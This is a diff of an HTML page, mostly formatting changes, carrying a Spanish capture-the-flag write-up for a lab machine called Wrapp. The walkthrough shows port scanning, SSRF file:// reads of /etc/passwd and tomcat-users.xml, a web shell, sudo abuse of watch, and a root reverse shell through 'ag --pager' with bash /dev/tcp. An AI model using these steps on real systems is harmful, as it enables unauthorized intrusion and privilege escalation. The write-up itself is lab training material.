@@ -23,9 +23,6 @@
       href="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.7.0/build/styles/default.min.css">
     <link rel="stylesheet" href="../../assets/highlight/styles/vs2015.min.css">
     <script src="../../assets/highlight/highlight.min.js"></script>
-    
-
-    <!-- <link rel="stylesheet" href="../../assets/css/prism.css"> -->
     <link rel="stylesheet" href="../../assets/css/nyx_w.css">  
 </head>
 <body>
@@ -42,7 +39,7 @@
             <img class="img_nyx" src="../../assets/img/nyx_wrapp/logo.png" alt="logo">
             <h3>Escaneo de puertos</h3>
             <pre class="pre__nyx">
-<code class="language-python">❯ nmap -p- -T5 -v -n 192.168.1.150
+<code class="code language-txt">❯ nmap -p- -T5 -v -n 192.168.1.150
 
 PORT   STATE SERVICE
 22/tcp open  ssh
@@ -50,7 +47,7 @@ PORT   STATE SERVICE
 </code></pre>
             <h3>Escaneo de servicios</h3>
 <pre class="pre__nyx">
-<code class="language-python">❯ nmap -sVC -v -p 22,80 192.168.1.150
+<code class="code language-txt">❯ nmap -sVC -v -p 22,80 192.168.1.150
 
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
@@ -67,9 +64,9 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 </code></pre>
             <h3>Puerto 80</h3>                
             <img class="img_m" src="../../assets/img/nyx_wrapp/tryharder.png" alt="tryharder">
-            <p>Enumerando con wfuzz encuentro el directorio<code class="code_negrita">&nbsp;advanced-search</code>.</p>
+            <p>Enumerando con wfuzz encuentro el directorio<code class="code_negrita">&nbsp;advanced-search&nbsp;</code>.</p>
 <pre class="pre__nyx">
-<code class="language-js">❯ wfuzz -c -t 200 --hc=404 --hw=2 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://192.168.1.150/FUZZ
+<code class="code language-txt">❯ wfuzz -c -t 200 --hc=404 --hw=2 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://192.168.1.150/FUZZ
 ********************************************************
 * Wfuzz 3.1.0 - The Web Fuzzer                         *
 ********************************************************
@@ -84,7 +81,7 @@ ID           Response   Lines    Word       Chars       Payload
             <img class="img_b" src="../../assets/img/nyx_wrapp/advanced-search.png" alt="advanced-search">
 
             <p>Con<code class="code_negrita">&nbsp;wfuzz&nbsp;</code>realizo una enumeración de puertos internos y encuentro el puerto 65000.</p>
-<pre class="pre__nyx"><code class="language-js">❯ wfuzz -c --hw=0 -t 100 -z range,1-65535 "http://192.168.1.150/advanced-search/path.php?path=localhost:FUZZ"
+<pre class="pre__nyx"><code class="code language-txt">❯ wfuzz -c --hw=0 -t 100 -z range,1-65535 "http://192.168.1.150/advanced-search/path.php?path=localhost:FUZZ"
 ********************************************************
 * Wfuzz 3.1.0 - The Web Fuzzer                         *
 ********************************************************
@@ -101,10 +98,10 @@ ID           Response   Lines    Word       Chars       Payload
             <p>Al ser un puerto interno escribo lo siguiente.</p>
             <img class="img_b" src="../../assets/img/nyx_wrapp/advanced-search-l-65000.png" alt="advanced-search-l-65000">
 
-            <p>Puedo observar una página web por defecto de tomcat. Al final de la página pone: Users are defined in<code class="code_negrita">&nbsp;/etc/tomcat9/tomcat-users.xml</code>.</p>
+            <p>Puedo observar una página web por defecto de tomcat. Al final de la página pone: Users are defined in<code class="code_negrita">&nbsp;/etc/tomcat9/tomcat-users.xml&nbsp;</code>.</p>
             <img class="img_b" src="../../assets/img/nyx_wrapp/advanced-search-65000.png" alt="advanced-search-65000">
-            <p>Después de quedarme atascado en esta parte y gracias a una pista del sr<code class="code_negrita">&nbsp;d4t4s3c&nbsp;</code>encuentro el wrapper<code class="code_negrita">&nbsp;file:///&nbsp;</code>que uso para ver el fichero en<code class="code_negrita">&nbsp;/etc/passwd</code>.</p>
-<pre class="pre__nyx"><code class="language-js">❯ curl -s "http://192.168.1.150/advanced-search/path.php?path=file%3A%2F%2F%2Fetc%2Fpasswd"
+            <p>Después de quedarme atascado en esta parte y gracias a una pista del sr<code class="code_negrita">&nbsp;d4t4s3c&nbsp;</code>encuentro el wrapper<code class="code_negrita">&nbsp;file:///&nbsp;</code>que uso para ver el fichero en<code class="code_negrita">&nbsp;/etc/passwd&nbsp;</code>.</p>
+<pre class="pre__nyx"><code class="code language-txt">❯ curl -s "http://192.168.1.150/advanced-search/path.php?path=file%3A%2F%2F%2Fetc%2Fpasswd"
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
@@ -136,12 +133,12 @@ tomcat:x:998:998:Apache Tomcat:/:/usr/sbin/nologin
 </code></pre>
 
             <p>Uso curl de nuevo para ver el archivo<code class="code_negrita">&nbsp;tomcat-users.xml&nbsp;</code>y encuentro las credenciales del usuario edward.</p>
-<pre class="pre__nyx"><code class="language-js">❯ curl -s "http://192.168.1.150/advanced-search/path.php?path=file:////etc/tomcat9/tomcat-users.xml"
+<pre class="pre__nyx"><code class="code language-txt">❯ curl -s "http://192.168.1.150/advanced-search/path.php?path=file:////etc/tomcat9/tomcat-users.xml"
 </code></pre>
 <img class="img_b" src="../../assets/img/nyx_wrapp/edward-creds.png" alt="edward-creds">
 
             <p>Me conecto al fin a la máquina objetivo.</p>
-<pre class="pre__nyx"><code class="language-js">❯ ssh edward@192.168.1.150
+<pre class="pre__nyx"><code class="code language-txt">❯ ssh edward@192.168.1.150
 edward@192.168.1.150's password: 
 Linux wrapp 4.19.0-23-amd64 #1 SMP Debian 4.19.269-1 (2022-12-20) x86_64
 edward@wrapp:~$
@@ -149,7 +146,7 @@ edward@wrapp:~$
 
 
         <p>Enumerando todos los archivos con permisos de escritura veo que en el directorio<code class="code_negrita">&nbsp;advanced-search&nbsp;</code>tengo permisos de escritura, lectura y ejecución.</p>
-<pre class="pre__nyx"><code class="language-js">edward@wrapp:~$ find / -writable 2>/dev/null | grep -v -i -E 'proc' | xargs ls -l
+<pre class="pre__nyx"><code class="code language-txt">edward@wrapp:~$ find / -writable 2>/dev/null | grep -v -i -E 'proc' | xargs ls -l
 
 /var/www/html/advanced-search:
 total 8
@@ -157,9 +154,9 @@ total 8
 -rwxrwxrwx 1 root root 249 jul 27  2021 path.php
 </code></pre>
 
-        <p>Creo una shell en<code class="code_negrita">&nbsp;advanced-search&nbsp;</code>y obtengo otra shell como usuario<code class="code_negrita">&nbsp;www-data</code>.</p>
+        <p>Creo una shell en<code class="code_negrita">&nbsp;advanced-search&nbsp;</code>y obtengo otra shell como usuario<code class="code_negrita">&nbsp;www-data&nbsp;</code>.</p>
 <pre class="pre__nyx">
-<code class="language-js">❯ nc -lvnp 1234
+<code class="code language-txt">❯ nc -lvnp 1234
 listening on [any] 1234 ...
 connect to [192.168.1.18] from (UNKNOWN) [192.168.1.150] 36358
 Linux wrapp 4.19.0-23-amd64 #1 SMP Debian 4.19.269-1 (2022-12-20) x86_64 GNU/Linux
@@ -173,7 +170,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
         <p>Enumero permisos con sudo.</p>
 <pre class="pre__nyx">
-<code class="language-js">ww-data@wrapp:/$ sudo -l
+<code class="code language-txt">ww-data@wrapp:/$ sudo -l
 
 Matching Defaults entries for www-data on wrapp:
     env_reset, mail_badpass,
@@ -183,21 +180,21 @@ User www-data may run the following commands on wrapp:
     (henry) NOPASSWD: /usr/bin/watch
 </code></pre>
 
-        <p>Para pivotar de<code class="code_negrita">&nbsp;www-data&nbsp;</code>a<code class="code_negrita">&nbsp;henry&nbsp;</code>he usado este recurso de<code class="code_negrita">gtfobins</code>.</p>
+        <p>Para pivotar de<code class="code_negrita">&nbsp;www-data&nbsp;</code>a<code class="code_negrita">&nbsp;henry&nbsp;</code>he usado este recurso de<code class="code_negrita">&nbsp;gtfobins&nbsp;</code>.</p>
 <pre class="pre__nyx">
-<code class="language-txt">https://gtfobins.github.io/gtfobins/watch/#sudo
+<code class="code language-txt">https://gtfobins.github.io/gtfobins/watch/#sudo
 </code></pre>
 
         <p>Obtengo una shell como usuario henry</p>
 <pre class="pre__nyx">
-<code class="language-js">www-data@wrapp:/$ sudo -u henry /usr/bin/watch -x bash -c 'reset; exec bash 1>&0 2>&0'
+<code class="code language-txt">www-data@wrapp:/$ sudo -u henry /usr/bin/watch -x bash -c 'reset; exec bash 1>&0 2>&0'
 henry@wrapp:/$ id  
 uid=1001(henry) gid=1001(henry) groups=1001(henry)
 </code></pre>
 
         <p>Enumero de nuevo los permisos que tengo con sudo.</p>
 <pre class="pre__nyx">
-<code class="language-js">henry@wrapp:/$ sudo -l
+<code class="code language-txt">henry@wrapp:/$ sudo -l
 
 Matching Defaults entries for henry on wrapp:
     env_reset, mail_badpass,
@@ -207,9 +204,9 @@ User henry may run the following commands on wrapp:
     (root) NOPASSWD: /usr/bin/ag
 </code></pre>
 
-        <p>Lanzo el binario para que busque la letra<code class="code_negrita">&nbsp;c&nbsp;</code>dentro del fichero<code class="code_negrita">&nbsp;root.txt&nbsp;</code>ubicado en<code class="code_negrita">&nbsp;/root.&nbsp;</code>Al mostrarme el contenido me doy cuenta de que estoy usando correctamente la sintaxis del binario.</p>
+        <p>Lanzo el binario para que busque la letra<code class="code_negrita">&nbsp;c&nbsp;</code>dentro del fichero<code class="code_negrita">&nbsp;root.txt&nbsp;</code>ubicado en<code class="code_negrita">&nbsp;/root&nbsp;</code>. Al mostrarme el contenido me doy cuenta de que estoy usando correctamente la sintaxis del binario.</p>
 <pre class="pre__nyx">
-<code class="language-js">henry@wrapp:/$ sudo -u root /usr/bin/ag c /root/root.txt
+<code class="code language-txt">henry@wrapp:/$ sudo -u root /usr/bin/ag c /root/root.txt
 sudo -u root /usr/bin/ag c /root/root.txt
 sudo: unable to resolve host wrapp: Name or service not known
 1:**************c**c**************
@@ -217,14 +214,14 @@ sudo: unable to resolve host wrapp: Name or service not known
 
         <p>Después de varios intentos y de leer el<code class="code_negrita">&nbsp;man&nbsp;</code>de la herramienta consigo el root de la siguiente forma:</p>
 <pre class="pre__nyx">
-<code class="language-js">henry@wrapp:/$ sudo -u root /usr/bin/ag --pager "/bin/bash -c \"/bin/bash -i >& /dev/tcp/192.168.1.18/1337 0>&1\""
+<code class="code language-txt">henry@wrapp:/$ sudo -u root /usr/bin/ag --pager "/bin/bash -c \"/bin/bash -i >& /dev/tcp/192.168.1.18/1337 0>&1\""
 
 root@wrapp:~# id
 id
 uid=0(root) gid=0(root) groups=0(root)
 </code></pre>
 
-        <p>Y con esto ya tenemos resulta la máquina Wrapp del sr d4t4s3c, Saludos!</p>
+        <p>Y con esto ya tenemos resulta la máquina Wrapp del sr d4t4s3c!</p>
         <i class="cursiva">Agradecimientos al sr d4t4s3c por sus pistas ;)</i>
 
     </main>
